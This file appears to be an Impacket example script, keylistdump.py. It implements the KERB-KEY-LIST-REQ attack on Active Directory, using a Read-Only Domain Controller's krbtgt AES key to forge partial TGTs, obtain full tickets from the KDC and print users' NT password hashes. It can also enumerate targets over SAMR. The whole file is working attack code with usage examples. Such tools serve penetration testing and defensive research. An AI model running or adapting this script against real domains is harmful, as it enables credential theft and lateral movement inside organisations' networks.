#!/usr/bin/python3
# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2021 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Performs the KERB-KEY-LIST-REQ attack to dump secrets
#   from the remote machine without executing any agent there
#
#   If the SMB credentials are supplied, the script starts by
#   enumerating the domain users via SAMR. Otherwise, the attack
#   is executed against the specified targets.
#
#   Examples:
#       ./keylistdump.py -auth contoso.com/jdoe:pass -kdc 10.1.1.1 -rodcNo 20000 -rodcKey <aesKey>
#       ./keylistdump.py -t jdoe -td contoso.com -kdc kdcserver.contoso.com -rodcNo 20000 -rodcKey <aesKey>
#       ./keylistdump.py -tf targetfile.txt -td contoso.com -kdc kdcserver.contoso.com -rodcNo 20000 -rodcKey <aesKey>
#
# Author:
#   Leandro Cuozzo (@0xdeaddood)
#

import datetime
import logging
import random
import string

from binascii import unhexlify
from pyasn1.codec.der import encoder, decoder

from impacket.dcerpc.v5 import samr, transport
from impacket.examples import logger
from impacket.examples.utils import parse_credentials
from impacket.krb5 import constants
from impacket.krb5.asn1 import Ticket as TicketAsn1, EncTicketPart, AP_REQ, seq_set, Authenticator, TGS_REQ, \
    seq_set_iter, TGS_REP, EncTGSRepPart, KERB_KEY_LIST_REP
from impacket.krb5.constants import ProtocolVersionNumber, TicketFlags, PrincipalNameType, encodeFlags, EncryptionTypes
from impacket.krb5.crypto import Key, _enctype_table
from impacket.krb5.kerberosv5 import sendReceive
from impacket.krb5.types import KerberosTime, Principal, Ticket
from impacket.smbconnection import SMBConnection
from impacket.version import version

try:
    rand = random.SystemRandom()
except NotImplementedError:
    rand = random
    pass


class KeyListDump:
    def __init__(self, domain, kdcHost, rodcNo, rodcKey, full, enum, username, password, targets):
        self.__domain = domain
        self.__username = username
        self.__password = password
        self.__aesKeyRodc = rodcKey
        self.__kdcHost = kdcHost
        self.__rodc = rodcNo
        self.__kvno = 1
        self.__enum = enum
        self.__targets = targets
        self.__full = full

    def run(self):
        logging.info('Running')
        if self.__enum is True:
            targetList = self.getUserList()
        else:
            targetList = self.__targets

        logging.info('Dumping Domain Credentials (domain\\uid:[rid]:nthash)')
        logging.info('Using the KERB-KEY-LIST request method. Tickets everywhere!')
        for targetUser in targetList:
            user = targetUser.split(":")[0]
            targetUserName = Principal('%s' % user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            partialTGT, sessionKey = self.createPartialTGT(targetUserName)
            fullTGT = self.getFullTGT(targetUserName, partialTGT, sessionKey)
            if fullTGT is not None:
                key = self.getKey(fullTGT, sessionKey)
                print(self.__domain + "\\" + targetUser + ":" + key[2:])

    def getUserList(self):
        logging.info('Enumerating target users. This may take a while on large domains')

        # connect SMB
        smbConnection = SMBConnection(self.__kdcHost, self.__kdcHost)
        smbConnection.login(self.__username, self.__password, self.__domain, "", "")
        # connect SAMR
        rpc = transport.DCERPCTransportFactory(r'ncacn_np:445[\pipe\samr]')
        rpc.set_smb_connection(smbConnection)
        samrConnection = rpc.get_dce_rpc()
        samrConnection.connect()
        samrConnection.bind(samr.MSRPC_UUID_SAMR)
        resp = samr.hSamrConnect(samrConnection)
        serverHandle = resp['ServerHandle']
        resp = samr.hSamrLookupDomainInSamServer(samrConnection, serverHandle, self.__domain)
        # domainSid = resp['DomainId'].formatCanonical()
        resp = samr.hSamrOpenDomain(samrConnection, serverHandle=serverHandle, domainId=resp['DomainId'])
        domainHandle = resp['DomainHandle']

        # get all groups
        resp = samr.hSamrEnumerateGroupsInDomain(samrConnection, domainHandle)
        groupList = []
        for group in resp['Buffer']['Buffer']:
            groupList.append(group['RelativeId'])
        # get all aliases
        resp = samr.hSamrEnumerateAliasesInDomain(samrConnection, domainHandle)
        aliasList = []
        for alias in resp['Buffer']['Buffer']:
            aliasList.append(alias['RelativeId'])

        # removed RIDs in group Denied Password Replication
        deniedRidList = [500, 501, 502, 503]
        resp = samr.hSamrOpenAlias(samrConnection, domainHandle, aliasId=572)
        aliasHandle = resp['AliasHandle']
        resp = samr.hSamrGetMembersInAlias(samrConnection, aliasHandle)
        for item in resp['Members']['Sids']:
            rid = item['Data']['SidPointer']['SubAuthority'][4]
            if rid in groupList:
                resp = samr.hSamrOpenGroup(samrConnection, domainHandle, groupId=rid)
                resp = samr.hSamrGetMembersInGroup(samrConnection, resp['GroupHandle'])
                for item2 in resp['Members']['Members']:
                    rid2 = item2['Data']
                    if rid2 not in deniedRidList and rid2 not in groupList and rid2 not in aliasList:
                        deniedRidList.append(rid2)
            elif rid in aliasList:
                resp = samr.hSamrOpenAlias(samrConnection, domainHandle, aliasId=rid)
                resp = samr.hSamrGetMembersInAlias(samrConnection, resp['AliasHandle'])
                for item2 in resp['Members']['Sids']:
                    rid2 = item2['Data']
                    if rid2 not in deniedRidList and rid2 not in groupList and rid2 not in aliasList:
                        deniedRidList.append(rid2)
            else:
                if rid not in deniedRidList:
                    deniedRidList.append(rid)

        # get all users
        resp = samr.hSamrEnumerateUsersInDomain(samrConnection, domainHandle, userAccountControl=samr.USER_NORMAL_ACCOUNT |
                                                samr.USER_WORKSTATION_TRUST_ACCOUNT | samr.USER_SERVER_TRUST_ACCOUNT |
                                                samr.USER_INTERDOMAIN_TRUST_ACCOUNT, enumerationContext=0)
        targetList = []
        for user in resp['Buffer']['Buffer']:
            #
            if self.__full is True or user['RelativeId'] not in deniedRidList:
                targetList.append(user['Name'] + ":" + str(user['RelativeId']))

        return targetList

    def createPartialTGT(self, userName):
        # we need the ticket template
        partialTGT = TicketAsn1()
        partialTGT['tkt-vno'] = ProtocolVersionNumber.pvno.value
        partialTGT['realm'] = self.__domain
        partialTGT['sname'] = noValue
        partialTGT['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value
        partialTGT['sname']['name-string'][0] = 'krbtgt'
        partialTGT['sname']['name-string'][1] = self.__domain
        partialTGT['enc-part'] = noValue
        partialTGT['enc-part']['kvno'] = self.__rodc << 16
        partialTGT['enc-part']['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value

        # we create the encrypted ticket part with these flags: 01000000100000010000000000000000
        encTicketPart = EncTicketPart()
        flags = list()
        flags.append(TicketFlags.forwardable.value)
        flags.append(TicketFlags.renewable.value)
        flags.append(TicketFlags.enc_pa_rep.value)

        # we fill in the encripted part
        encTicketPart['flags'] = encodeFlags(flags)
        encTicketPart['key'] = noValue
        encTicketPart['key']['keytype'] = partialTGT['enc-part']['etype']
        encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(32)])
        encTicketPart['crealm'] = self.__domain
        encTicketPart['cname'] = noValue
        encTicketPart['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
        encTicketPart['cname']['name-string'] = noValue
        encTicketPart['cname']['name-string'][0] = userName
        encTicketPart['transited'] = noValue
        encTicketPart['transited']['tr-type'] = 0
        encTicketPart['transited']['contents'] = ''
        encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
        encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
        # let's extend the ticket's validity a lil bit
        ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(days=int(120))
        encTicketPart['endtime'] = KerberosTime.to_asn1(ticketDuration)
        encTicketPart['renew-till'] = KerberosTime.to_asn1(ticketDuration)
        # we don't need PAC
        encTicketPart['authorization-data'] = noValue
        # we encode the encripted part and we encrypt it with the RODC key
        encodedEncTicketPart = encoder.encode(encTicketPart)
        cipher = _enctype_table[partialTGT['enc-part']['etype']]
        key = Key(cipher.enctype, unhexlify(self.__aesKeyRodc))
        # key usage 2 -> key tgt service
        cipherText = cipher.encrypt(key, 2, encodedEncTicketPart, None)

        partialTGT['enc-part']['cipher'] = cipherText
        sessionKey = encTicketPart['key']['keyvalue']

        return partialTGT, sessionKey

    def getFullTGT(self, userName, partialTGT, sessionKey):
        ticket = Ticket()
        ticket.from_asn1(partialTGT)

        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = list()
        apReq['ap-options'] = constants.encodeFlags(opts)
        seq_set(apReq, 'ticket', ticket.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = partialTGT['realm'].asOctets()

        seq_set(authenticator, 'cname', userName.components_to_asn1)

        now = datetime.datetime.utcnow()
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        encodedAuthenticator = encoder.encode(authenticator)
        cipher = _enctype_table[partialTGT['enc-part']['etype']]
        keyAuth = Key(cipher.enctype, bytes(sessionKey))
        encryptedEncodedAuthenticator = cipher.encrypt(keyAuth, 7, encodedAuthenticator, None)

        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        tgsReq = TGS_REQ()
        tgsReq['pvno'] = 5
        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
        tgsReq['padata'] = noValue
        tgsReq['padata'][0] = noValue
        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        encodedApReq = encoder.encode(apReq)
        tgsReq['padata'][0]['padata-value'] = encodedApReq
        tgsReq['padata'][1] = noValue
        tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.KERB_KEY_LIST_REQ.value)
        encodedKeyReq = encoder.encode([23], asn1Spec=SequenceOf(componentType=Integer()))
        tgsReq['padata'][1]['padata-value'] = encodedKeyReq

        reqBody = seq_set(tgsReq, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.canonicalize.value)

        reqBody['kdc-options'] = constants.encodeFlags(opts)
        serverName = Principal("krbtgt", type=PrincipalNameType.NT_SRV_INST.value)
        reqBody['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value
        reqBody['sname']['name-string'][0] = serverName
        reqBody['sname']['name-string'][1] = self.__domain
        reqBody['realm'] = self.__domain

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = rand.getrandbits(31)
        seq_set_iter(reqBody, 'etype',
                     (
                         int(cipher.enctype),
                         int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
                         int(constants.EncryptionTypes.rc4_hmac.value),
                         int(constants.EncryptionTypes.rc4_hmac_exp.value),
                         int(constants.EncryptionTypes.rc4_hmac_old_exp.value)
                     )
                     )

        message = encoder.encode(tgsReq)
        # let's send our TGS Request, the response will include the FULL TGT with the keys!!!
        try:
            logging.debug("Requesting a service ticker for the user %s", userName)
            resp = sendReceive(message, self.__domain, self.__kdcHost)
        except Exception as error:
            if str(error).find('KDC_ERR_TGT_REVOKED') >= 0 or str(error).find('KDC_ERR_CLIENT_REVOKED') >= 0:
                logging.error("User %s is not allowed to have passwords replicated in RODCs", userName)
            elif str(error).find('KDC_ERR_C_PRINCIPAL_UNKNOWN') >= 0:
                logging.error("User %s doesn't exist", userName)
            elif str(error).find('KDC_ERR_WRONG_REALM') >= 0:
                logging.error("Domain %s doesn't exist", self.__domain)
                sys.exit(1)
            else:
                logging.error(error)
            return None
        return resp

    @staticmethod
    def getKey(resp, sessionKey):
        tgsRep = decoder.decode(resp, asn1Spec=TGS_REP())[0]

        encTGSRepPart = tgsRep['enc-part']
        enctype = encTGSRepPart['etype']
        cipher = _enctype_table[enctype]

        keyAuth = Key(cipher.enctype, bytes(sessionKey))
        decryptedTGSRepPart = cipher.decrypt(keyAuth, 8, encTGSRepPart['cipher'])
        decodedTGSRepPart = decoder.decode(decryptedTGSRepPart, asn1Spec=EncTGSRepPart())[0]
        encPaData1 = decodedTGSRepPart['encrypted_pa_data'][0]
        decodedPaData1 = decoder.decode(encPaData1['padata-value'], asn1Spec=KERB_KEY_LIST_REP())[0]
        key = decodedPaData1[0]['keyvalue'].prettyPrint()

        return key


if __name__ == '__main__':
    import argparse
    import sys

    try:
        import pyasn1
        from pyasn1.type.univ import noValue, SequenceOf, Integer
    except ImportError:
        print('This module needs pyasn1 installed')
        sys.exit(1)

    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help=True, description="Performs the KERB-KEY-LIST-REQ attack to dump "
                                                                "secrets from the remote machine without executing any agent there.")
    parser.add_argument('-auth', action='store', metavar='[domain/]username[:password]',
                        help='Use this credential to authenticate to SMB and list domain users (low-privilege account)')
    parser.add_argument('-kdc', action='store', help='KDC hostname or IP')
    parser.add_argument('-t', action='store', help='Attack only the username specified')
    parser.add_argument('-tf', action='store', help='File that contains a list of target usernames')
    parser.add_argument('-td', action='store', help='Domain of the target user/s (only works with -t or -tf)')
    parser.add_argument('-rodcNo', action='store', type=int, help='Number of the RODC krbtgt account')
    parser.add_argument('-rodcKey', action='store', help='AES key of the Read Only Domain Controller')
    parser.add_argument('-full', action='store_true', default=False,
                        help='Run the attack against all domain users. Noisy! It could lead to more TGS requests being rejected (only works with -auth)')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    if options.kdc is None:
        logging.error("You must specify the KDC hostname or IP")
        sys.exit(1)

    if options.rodcNo is None:
        logging.error("You must specify the RODC number (krbtgt_XXXXX)")
        sys.exit(1)

    if options.rodcKey is None:
        logging.error("You must specify the RODC aes key")
        sys.exit(1)

    if options.auth is not None:
        domain, username, password = parse_credentials(options.auth)
        if domain == '':
            logging.error("You must specify a target domain")
            sys.exit(1)
        if username == '':
            logging.error("You must specify a username")
            sys.exit(1)
        keylistdump = KeyListDump(domain, options.kdc, options.rodcNo, options.rodcKey, options.full, True, username,
                                  password, targets=[])
    elif options.td is not None:
        targets = []
        if options.full is True:
            logging.warning("Flag -full will have no effect")
        if options.t is not None:
            targets.append(options.t)
        elif options.tf is not None:
            try:
                with open(options.tf, 'r') as f:
                    for line in f:
                        target = line.strip()
                        if target != '' and target[0] != '#':
                            targets.append(target + ":" + "N/A")
            except IOError as error:
                logging.error("Could not open file: %s - %s", options.tf, str(error))
                sys.exit(1)
            if len(targets) == 0:
                logging.error("No valid targets specified!")
                sys.exit(1)
        else:
            logging.error("You must specify a target username or targets file")
            sys.exit(1)
        keylistdump = KeyListDump(options.td, options.kdc, options.rodcNo, options.rodcKey, options.full, False, "", "",
                                  targets)
    else:
        logging.error("You must specify a target domain")
        sys.exit(1)

    try:
        keylistdump.run()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback

            traceback.print_exc()
        logging.error(e)
